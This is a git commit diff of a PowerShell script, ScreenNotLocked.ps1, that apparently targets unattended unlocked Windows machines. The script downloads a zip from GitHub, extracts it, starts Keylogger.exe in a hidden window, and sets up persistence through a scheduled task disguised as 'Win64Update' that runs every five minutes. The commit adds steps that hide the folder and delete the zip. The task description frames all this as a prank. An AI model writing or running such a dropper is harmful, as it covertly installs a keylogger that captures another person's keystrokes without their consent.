6612d31c7528fcca6a6b1f1964aec3f983961546
Martijn <45517189+MartijnJStans@users.noreply.github.com>
2024-04-06 20:23:43 +0200

    Update ScreenNotLocked.ps1

--- ScreenNotLocked.ps1
+++ ScreenNotLocked.ps1
@@ -1,13 +1,14 @@
-﻿$FolderName = "C:\temp\"
-if (Get-Item -Path $FolderName -ErrorAction Ignore) {
-} else {
-    New-Item $FolderName -ItemType Directory
+if (Get-Item -Path "C:\temp\" -ErrorAction Ignore) {  } else {
+    New-Item "C:\temp\" -ItemType Directory
 }
 
 Invoke-WebRequest -Uri "https://github.com/MartijnJStans/ScreenNotLocked/archive/refs/heads/main.zip" -OutFile "C:\temp\KeyLogger.zip"
-Expand-Archive -LiteralPath "C:\temp\KeyLogger.zip"
+Expand-Archive -LiteralPath "C:\temp\KeyLogger.zip" -DestinationPath "C:\temp\Keylogger"
 Start-Process -FilePath "C:\temp\KeyLogger\ScreenNotLocked-main\Keylogger.exe" -WindowStyle Hidden
 
-$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'Start-Process -FilePath "C:\temp\KeyLogger\ScreenNotLocked-main\Keylogger.exe" -WindowStyle Hidden'
+& attrib +h "C:\temp\KeyLogger"
+Remove-Item -Path "C:\temp\KeyLogger.zip"
+
+$action = New-ScheduledTaskAction -Execute 'C:\temp\KeyLogger\ScreenNotLocked-main\Keylogger.exe'
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Win64Update" -Description "Hey buddy, Did you forget something? Maybe next time lock your screen"
